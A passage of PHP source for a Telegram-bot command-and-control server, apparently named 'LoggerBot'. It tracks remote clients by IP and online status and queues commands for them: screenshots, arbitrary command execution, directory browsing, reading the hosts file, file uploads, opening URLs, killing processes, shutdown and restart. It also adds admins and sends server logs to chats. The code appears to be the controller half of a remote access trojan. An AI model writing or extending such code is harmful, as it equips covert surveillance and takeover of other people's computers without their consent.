                $this->logError("Invalid encrypted data: Empty ciphertext or IV: " . substr($encryptedData, 0, 50) . "...");
                return '';
            }

            $ivDecoded = base64_decode($iv, true);
            if ($ivDecoded === false || strlen($ivDecoded) !== 16) {
                $this->logError("Invalid IV: Failed to decode or incorrect length: $iv");
                return '';
            }

            $key = base64_decode(Config::$ENCRYPTION_KEY);
            if (!$key) {
                $this->logError("Invalid encryption key: Failed to decode Config::$ENCRYPTION_KEY");
                return '';
            }

            $decrypted = openssl_decrypt(
                $ciphertext,
                'aes-256-cbc',
                $key,
                0,
                $ivDecoded
            );

            if ($decrypted === false) {
                $this->logError("Decryption failed for data: " . substr($encryptedData, 0, 50) . "...");
                return '';
            }

            $this->logWebhook("Successfully decrypted data: " . substr($decrypted, 0, 50) . "...");
            return $decrypted;
        } catch (Exception $e) {
            $this->logError("Decryption error: " . $e->getMessage() . ", data: " . substr($encryptedData, 0, 50) . "...");
            return '';
        }
    }

    private function sendTelegramMessage($chatId, $text, $options = []) {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/sendMessage";
        
        $parseMode = stripos($text, 'Error') !== false ? null : 'Markdown';
        
        $data = array_merge([
            'chat_id' => $chatId,
            'text' => $text
        ], $options);
    
        if ($parseMode) {
            $data['parse_mode'] = $parseMode;
        }
    
        if (isset($data['reply_markup'])) {
            $data['reply_markup'] = json_encode($data['reply_markup']);
        }
    
        $this->logWebhook("Sending Telegram message to chat_id: $chatId, payload: " . json_encode($data));
        $response = $this->makeCurlRequest($url, $data, false);
        $this->logWebhook("Telegram sendMessage response: " . $response);
        return $response;
    }

    private function sendTelegramFile($chatId, $filePath, $method = 'sendDocument') {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/$method";
        $data = [
            'chat_id' => $chatId,
            $method == 'sendPhoto' ? 'photo' : 'document' => new CURLFile($filePath)
        ];
        $this->logWebhook("Sending Telegram file to chat_id: $chatId, method: $method, file: $filePath");
        $response = $this->makeCurlRequest($url, $data, true);
        $this->logWebhook("Telegram sendFile response: " . $response);
        return $response;
    }

    private function makeCurlRequest($url, $data, $isFile = false) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        
        if ($isFile) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } else {
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        }
        
        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            $this->logError("cURL error: " . curl_error($ch) . ", URL: $url");
        }
        curl_close($ch);
        return $response;
    }

    private function getClientStatus() {
        try {
            $stmt = $this->pdo->prepare("SELECT client_id, ip_address, is_online, last_seen FROM clients WHERE last_seen > NOW() - INTERVAL 1 HOUR");
            $stmt->execute();
            $clients = $stmt->fetchAll();
            $this->logWebhook("Client status query returned: " . json_encode($clients));
            return $clients;
        } catch (PDOException $e) {
            $this->logError("Failed to get client status: " . $e->getMessage());
            return [];
        }
    }

    private function sendSystemStatus($recipient, $isClient = false) {
        if ($isClient) {
            return "System status command queued";
        }
        $this->sendTelegramMessage($recipient, "System status command queued");
        return "Status command queued";
    }

    private function handleScreenshot($recipient, $isClient = false) {
        if ($isClient) {
            return "Screenshot command queued";
        }
        $this->sendTelegramMessage($recipient, "Screenshot command queued");
        return "Screenshot command queued";
    }

    private function handleFileUpload($recipient, $filePath, $isClient = false) {
        if ($isClient) {
            return "File upload command queued";
        }
        $this->sendTelegramMessage($recipient, "File upload command queued");
        return "File upload command queued";
    }

    private function executeCommand($recipient, $command, $isClient = false) {
        if ($isClient) {
            return "Execute command queued";
        }
        $this->sendTelegramMessage($recipient, "Execute command queued");
        return "Execute command queued";
    }

    private function sendLogs($recipient, $isClient = false) {
        if ($isClient) {
            return "Logs command not supported on client";
        }
        $logFiles = [
            Config::$ERROR_LOG,
            Config::$WEBHOOK_LOG,
            Config::$TELEGRAM_LOG
        ];
        $results = [];

        foreach ($logFiles as $logFile) {
            if (file_exists($logFile) && filesize($logFile) <= Config::$MAX_LOG_SIZE) {
                $this->sendTelegramFile($recipient, $logFile);
            }
        }
        return "Logs sent";
    }

    private function getHosts($recipient, $isClient = false) {
        if ($isClient) {
            return "Hosts command queued";
        }
        $this->sendTelegramMessage($recipient, "Hosts command queued");
        return "Hosts command queued";
    }

    private function listScreenshots($recipient, $isClient = false) {
        if ($isClient) {
            return "Screenshots command not supported on client";
        }
        $files = glob(Config::$SCREENSHOT_DIR . '*.png');
        $fileList = array_map('basename', $files);
        $message = "Screenshots:\n" . (empty($fileList) ? "No screenshots found" : implode("\n", $fileList));
        $this->sendTelegramMessage($recipient, $message);
        return "Screenshot list sent";
    }

    private function browseDirectory($recipient, $path, $isClient = false) {
        if ($isClient) {
            return "Browse directory command queued";
        }
        $this->sendTelegramMessage($recipient, "Browse directory command queued");
        return "Browse directory command queued";
    }

    private function getSystemInfo($recipient, $isClient = false) {
        if ($isClient) {
            return "System info command queued";
        }
        $this->sendTelegramMessage($recipient, "System info command queued");
        return "System info command queued";
    }

    private function goToUrl($recipient, $url, $isClient = false) {
        if ($isClient) {
            return "Open URL command queued";
        }
        $this->sendTelegramMessage($recipient, "Open URL command queued");
        return "Open URL command queued";
    }

    private function systemShutdown($recipient, $isClient = false) {
        if ($isClient) {
            return "Shutdown command queued";
        }
        $this->sendTelegramMessage($recipient, "Shutdown command queued");
        return "Shutdown command queued";
    }

    private function testTelegram($recipient, $isClient = false) {
        if ($isClient) {
            return "Test Telegram command not supported on client";
        }
        $response = $this->makeCurlRequest("https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getMe", [], false);
        $message = json_decode($response, true)['ok'] ? "Telegram API is working" : "Telegram API test failed";
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function uploadFromUrl($recipient, $url, $isClient = false) {
        if ($isClient) {
            return "Upload from URL command queued";
        }
        $this->sendTelegramMessage($recipient, "Upload from URL command queued");
        return "Upload from URL command queued";
    }

    private function listTasks($recipient, $isClient = false) {
        if ($isClient) {
            return "List tasks command queued";
        }
        $this->sendTelegramMessage($recipient, "List tasks command queued");
        return "List tasks command queued";
    }

    private function manageStartup($recipient, $isClient = false) {
        if ($isClient) {
            return "Startup command not supported on client";
        }
        $this->sendTelegramMessage($recipient, "Startup management not fully implemented.");
        return "Startup command not supported";
    }

    private function signOut($recipient, $isClient = false) {
        if ($isClient) {
            return "Sign out command queued";
        }
        $this->sendTelegramMessage($recipient, "Sign out command queued");
        return "Sign out command queued";
    }

    private function systemSleep($recipient, $isClient = false) {
        if ($isClient) {
            return "Sleep command queued";
        }
        $this->sendTelegramMessage($recipient, "Sleep command queued");
        return "Sleep command queued";
    }

    private function systemRestart($recipient, $isClient = false) {
        if ($isClient) {
            return "Restart command queued";
        }
        $this->sendTelegramMessage($recipient, "Restart command queued");
        return "Restart command queued";
    }

    private function addAdmin($recipient, $newAdminId, $isClient = false) {
        try {
            $stmt = $this->pdo->prepare(
                "INSERT INTO users (user_id, is_active, is_admin, created_at) 
                VALUES (?, 1, 1, NOW()) 
                ON DUPLICATE KEY UPDATE is_admin = 1, is_active = 1"
            );
            $stmt->execute([$newAdminId]);
            $message = "Admin $newAdminId added successfully.";
        } catch (PDOException $e) {
            $message = "Failed to add admin: " . $e->getMessage();
            $this->logError("Add admin failed: " . $e->getMessage());
        }

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function listUsers($recipient, $isClient = false) {
        try {
            $stmt = $this->pdo->prepare("SELECT user_id, is_admin FROM users WHERE is_active = 1");
            $stmt->execute();
            $users = $stmt->fetchAll();
            
            $message = "Active users:\n";
            foreach ($users as $user) {
                $role = $user['is_admin'] ? '(Admin)' : '(User)';
                $message .= "- {$user['user_id']} $role\n";
            }
            $message = $message ?: "No active users.";
        } catch (PDOException $e) {
            $message = "Failed to list users: " . $e->getMessage();
            $this->logError("List users failed: " . $e->getMessage());
        }

        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return "Users listed";
    }

    private function logCommand($recipient, $command, $response = '') {
        try {
            $userId = $recipient;
            if (isset($GLOBALS['update']['message']['from']['id'])) {
                $userId = $GLOBALS['update']['message']['from']['id'];
            }
            $stmt = $this->pdo->prepare(
                "INSERT INTO command_logs (chat_id, user_id, command, response, created_at) 
                VALUES (?, ?, ?, ?, NOW())"
            );
            $stmt->execute([$recipient, $userId, $command, $response]);
        } catch (PDOException $e) {
            $this->logError("Failed to log command: " . $e->getMessage());
        }
    }

    private function logError($message) {
        $logMessage = "[" . date('Y-m-d H:i:s') . "] ERROR: $message\n";
        file_put_contents(Config::$ERROR_LOG, $logMessage, FILE_APPEND);
        $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, "Error: $message");
    }

    private function logWebhook($message) {
        $logMessage = "[" . date('Y-m-d H:i:s') . "] WEBHOOK: $message\n";
        file_put_contents(Config::$WEBHOOK_LOG, $logMessage, FILE_APPEND);
    }

    private function sendHelpMessage($recipient, $isClient = false) {
        $message = "Available commands:\n" .
                   "/start - Show client list\n" .
                   "/select <client_id> - Select a client\n" .
                   "/status - System status\n" .
                   "/screenshot - Take screenshot\n" .
                   "/exec <command> - Execute command\n" .
                   "/hosts - View hosts file\n" .
                   "/browse <path> - Browse directory\n" .
                   "/browse_recursive <path> - Recursive directory listing\n" .
                   "/get-info - System info\n" .
                   "/go <url> - Open URL\n" .
                   "/shutdown - Shutdown system\n" .
                   "/upload <file_path> - Upload file\n" .
                   "/upload_url <url> - Upload from URL\n" .
                   "/tasks - List running tasks\n" .
                   "/end_task <process_name> - End a running process\n" .
                   "/signout - Sign out\n" .
                   "/sleep - Sleep system\n" .
                   "/restart - Restart system\n" .
                   "/logs - View server logs\n" .
                   "/screens - List screenshots\n" .
                   "/test_telegram - Test Telegram API\n" .
                   "/listusers - List active users\n" .
                   "/addadmin <user_id> - Add admin";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }
}

$bot = new LoggerBot();
$bot->handleRequest();
?>